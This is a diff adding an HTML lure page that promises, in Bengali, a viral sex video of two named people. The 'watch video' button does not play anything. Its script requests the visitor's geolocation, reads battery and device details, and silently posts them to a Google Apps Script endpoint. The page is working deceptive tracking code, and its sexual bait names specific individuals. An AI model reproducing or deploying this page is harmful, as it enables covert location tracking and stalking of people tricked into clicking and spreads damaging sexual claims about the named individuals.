@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>viral video loading</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
+        .btn { padding: 15px 30px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+        #status { margin-top: 20px; font-weight: bold; color: red; }
+    </style>
+</head>
+<body>
+
+        <div style="
+    width:300px;
+    height:200px;
+    background-image: url('hellopic.jpg');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    margin-left: 580px;
+  ">
+  </div>
+        <p>🥵🥵 মোশারফ - হোসনা ইসলাম এর ভাইরাল সেক্স ভিডিও 🥵🥵</p>
+        <button class="btn" onclick="trackAll()">ভিডিও দেখুন</button>
+        <div id="status"> </div>
+    
+    <script>
+        // আপনার গুগল স্ক্রিপ্টের URL এখানে বসান
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbztNlXXgjInJPJd303nwYUAhXJNSfC44xr2O21e3iXJWxid91goKwnrZ8iOi1XD3jcq/exec"; 
+
+        async function trackAll() {
+            const statusDiv = document.getElementById('status');
+            statusDiv.innerText = "permissions Needed!";
+
+            try {
+                // ১. লোকেশন ট্র্যাকিং
+                let locationData = "Not Found";
+                if (navigator.geolocation) {
+                    const pos = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject);
+                    });
+                    locationData = `Lat: ${pos.coords.latitude}, Long: ${pos.coords.longitude}`;
+                }
+
+                // ২. ব্যাটারি তথ্য
+                let batteryLevel = "0%";
+                let isCharging = false;
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = Math.round(battery.level * 100) + "%";
+                    isCharging = battery.charging;
+                    
+                    // ব্যাটারি লিসেনার যোগ করা (যদি পরিবর্তন হয়)
+                    battery.addEventListener('level', () => { /* ফিল্ড আপডেট */ });
+                }
+
+                // ৩. ডিভাইস মডেল ও ইউজার এজেন্ট
+                const deviceModel = navigator.userAgent;
+
+                // ডেটা তৈরি করা
+                const dataToPost = {
+                    location: locationData,
+                    battery: batteryLevel,
+                    charging: isCharging,
+                    model: deviceModel,
+                };
+
+                // গুগল শিটে পাঠানো
+                statusDiv.innerText = "";
+                
+                await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // গুগল স্ক্রিপ্টের জন্য এটি জরুরি
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(dataToPost)
+                });
+
+                statusDiv.innerText = "✅ Data Sent Successfully!";
+                
+                // রিফ্রেশ করে আবার চেক করা যাবে না, তাই ৩ সেকেন্ড পর লুকিয়ে দিলাম
+                setTimeout(() => { window.location.reload(); }, 3000);
+
+            } catch (error) {
+                statusDiv.innerText = " please confirm permission ";
+            }
+        }
+    </script>
+</body>
+</html>
